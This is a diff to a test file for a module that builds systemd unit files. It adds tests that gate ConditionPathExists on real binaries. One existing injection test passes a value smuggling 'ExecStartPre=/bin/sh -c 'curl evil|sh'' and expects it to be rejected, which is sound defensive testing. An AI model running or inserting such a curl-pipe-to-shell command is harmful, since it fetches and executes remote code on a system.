@@ -45,7 +45,10 @@ describe("hooks/daemon-service — unit conditions", () => {
     const { systemdUnitContents, resolveWorkerCommand } = await import(
       "../../src/hooks/daemon-service"
     );
+    // Written to disk because only paths that EXIST are gated on — which is how
+    // an ExecStart carrying arguments is told apart from a bare path.
     const binary = join(dir, "failproofaid");
+    writeFileSync(binary, "#!/bin/sh\n", { mode: 0o755 });
     const unit = systemdUnitContents(binary, resolveWorkerCommand(), null);
 
     expect(unit).toContain(`ConditionPathExists=${binary}`);
@@ -66,6 +69,7 @@ describe("hooks/daemon-service — unit conditions", () => {
       "../../src/hooks/daemon-service"
     );
     const binary = join(dir, "failproofaid");
+    writeFileSync(binary, "#!/bin/sh\n", { mode: 0o755 });
     const unit = systemdUnitContents(binary, process.env.FAILPROOFAI_WORKER_CMD, null);
 
     expect(workerScriptPath()).toBeNull();
@@ -97,6 +101,32 @@ describe("hooks/daemon-service — unit conditions", () => {
     expect(() =>
       systemdUnitContents(`/tmp/x\nExecStartPre=/bin/sh -c 'curl evil|sh'`, null, null),
     ).toThrow();
+  });
+
+  it("does not gate on an ExecStart that carries arguments", async () => {
+    // `binaryPath` is an ExecStart value, and systemd accepts arguments there —
+    // this repo's own systemd lifecycle tests set FAILPROOFAI_DAEMON_BINARY to
+    // `/usr/bin/sleep infinity`. `ConditionPathExists=` takes a PATH, so gating
+    // on that string hunts for a file literally named "sleep infinity", never
+    // finds it, and skips a unit that would have run perfectly. Splitting on
+    // whitespace to recover the binary is not an option either: a path may
+    // legally contain spaces.
+    process.env.FAILPROOFAI_PACKAGE_ROOT = join(dir, "nope");
+    delete process.env.FAILPROOFAI_WORKER_CMD;
+    const { systemdUnitContents } = await import("../../src/hooks/daemon-service");
+    const unit = systemdUnitContents("/usr/bin/sleep infinity", null, null);
+
+    expect(unit).toContain("ExecStart=/usr/bin/sleep infinity");
+    expect(unit).not.toContain("ConditionPathExists=");
+  });
+
+  it("gates on a real binary that exists on disk", async () => {
+    const binary = join(dir, "failproofaid");
+    writeFileSync(binary, "#!/bin/sh\n", { mode: 0o755 });
+    process.env.FAILPROOFAI_PACKAGE_ROOT = join(dir, "nope");
+    delete process.env.FAILPROOFAI_WORKER_CMD;
+    const { systemdUnitContents } = await import("../../src/hooks/daemon-service");
+    expect(systemdUnitContents(binary, null, null)).toContain(`ConditionPathExists=${binary}`);
   });
 });
 
